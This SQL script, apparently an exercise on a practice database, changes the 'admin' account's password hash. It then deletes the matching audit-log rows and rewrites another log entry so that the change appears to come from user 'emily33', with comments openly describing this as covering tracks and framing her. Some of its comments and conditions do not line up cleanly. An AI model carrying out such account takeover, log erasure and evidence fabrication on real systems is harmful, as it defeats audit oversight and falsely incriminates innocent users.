-- Alter the password of the website’s administrative account, 
-- admin, to instead be “oops!”.
-- Note hash code for "oops!" is '982c0381c279d139fd221fce974916e7',
-- obtained from : https://www.md5hashgenerator.com/

UPDATE "users"
SET "password" = '982c0381c279d139fd221fce974916e7'
WHERE "username" = 'admin';


-- Erase any logs of the above password change recorded 
-- by the database.

DELETE
FROM "user_logs"
-- The old and new user names are added in the where clause
-- because it is likely that in certain databases (for example, 
-- test database), the 'admin'name had been modified (for example, 
-- from 'administrator' to 'admin') inside the database, before 
-- the hack operation.
WHERE "new_username" = 'admin'
AND "old_username" = 'admin'
-- The old and new passwords are specified because it is
-- possible that the 'account' has previously changed its
-- password with the new password.
AND "new_password" = '982c0381c279d139fd221fce974916e7'
AND "old_password" = 'e10adc3949ba59abbe56e057f20f883e';


-- Add false data to throw others off your trail. In particular, 
-- to frame emily33, make it only appear—in the user_logs table—as 
-- if the admin account has had its password changed to emily33’s password.

UPDATE "user_logs"
-- Set 'admin' password, before hack, as old 'emily33' password.
-- Then change 'emily33' username (new) to 'admin'.
-- Also set 'emily33' old_username to 'emily33' (from NULL).
SET "old_password" = 'e10adc3949ba59abbe56e057f20f883e',
    "old_username" = 'emily33',
    "new_username" = 'admin'
WHERE "id" = 2;
